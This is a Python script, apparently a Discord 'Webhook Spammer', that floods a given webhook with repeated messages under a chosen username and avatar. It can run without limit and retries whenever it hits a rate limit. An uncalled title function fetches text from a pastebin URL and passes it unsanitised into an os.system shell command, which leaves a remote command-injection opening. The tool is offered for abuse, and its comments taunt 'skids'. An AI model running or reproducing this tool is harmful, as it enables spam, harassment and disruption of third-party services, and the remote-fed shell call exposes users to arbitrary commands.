#tu veut modifier mon programme sale skide
#mad by sirapee

from pystyle import *



banner = """
  ____       _____      ____         _        ____    U _____ u U _____ u 
 / __"| u   |_ " _|  U |  _"\ u  U  /"\  u  U|  _"\ u \| ___"|/ \| ___"|/ 
<\___ \/      | |     \| |_) |/   \/ _ \/   \| |_) |/  |  _|"    |  _|"   
 u___) |     /| |\     |  _ <     / ___ \    |  __/    | |___    | |___   
 |____/>>   u |_|U     |_| \_\   /_/   \_\   |_|       |_____|   |_____|  
  )(  (__)  _// \\_    //   \\_   \\    >>   ||>>_     <<   >>   <<   >>  
 (__)      (__) (__)  (__)  (__) (__)  (__) (__)__)   (__) (__) (__) (__)

"""
print(Colorate.Vertical(Colors.blue_to_cyan, banner))

                  
def set_title():
  title = "Webhook Spammer"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")

import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)



try:
    import colorama, requests
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()





def webhook_spammer():
    colorama.init(autoreset=True)
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Webhook: ")
            webhook = input("")
            r_check = requests.get(webhook)
            r_check = str(r_check)
            if "200" in r_check:
                break
            if "200" not in r_check:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Webhook Invalid, Please Enter A Valid One")
        except Exception:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Webhook Invalid, Please Enter A Valid One")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Message: ")
    content = input("")
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Want An Avatar (y/n): ")
        avatar_y_n = input("")
        if avatar_y_n == "n" or avatar_y_n == "y":
            break
        else:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print015("Enter A Valid Choice")
    if avatar_y_n == "y":
        while True:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Avatar Url: ")
            avatar_url = input("")
            if "http://" in avatar_url or "https://" in avatar_url:
                break
            else:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print015("Enter A Valid Choice")
    if avatar_y_n == "n":
        avatar_url = ""
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Bot Username: ")
    username = input("")
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Limit (i for infinity): ")
        limit = input("")
        if limit == "i" or limit == "I":
            break
        try:
            limit = int(limit)
            break
        except Exception:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print015("Enter A Valid Choice")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Delay (0 For None): ")
            delay = input("")
            delay = float(delay)
            break
        except:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print015("Enter A Valid Choice")
    if limit == "i" or limit == "I":
        limit = str(limit)
        
    den = 0
    if limit == "i" or limit == "I":
        while True:
            r = requests.post(webhook, json={"avatar_url": avatar_url, "username": username, "content": content})
            r = str(r)
            if "204" in r:
                den = int(den) + 1
                print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}/{colorama.Fore.RESET}INFINITY{colorama.Fore.CYAN}]{colorama.Fore.RESET} Sent Message To The {colorama.Fore.CYAN}Webhook")
            if "429" in r:
                print(f"{colorama.Fore.RED}[{colorama.Fore.RESET}ERROR{colorama.Fore.RED}]{colorama.Fore.RESET} Rate Limited, {colorama.Fore.RED}Retrying")



    for u in range(int(limit)):
        while True:
            r = requests.post(webhook, json={"avatar_url": avatar_url, "username": username, "content": content})
            r = str(r)
            if "204" in r:
                den = int(den) + 1
                print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}/{colorama.Fore.RESET}{str(limit)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Sent Message To The {colorama.Fore.CYAN}Webhook")
                break
            if "429" in r:
                print(f"{colorama.Fore.RED}[{colorama.Fore.RESET}ERROR{colorama.Fore.RED}]{colorama.Fore.RESET} Rate Limited, {colorama.Fore.RED}Retrying")


    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Done Spamming Webhook, Press Enter To Close The Program")
    input("")
    exit()



webhook_spammer()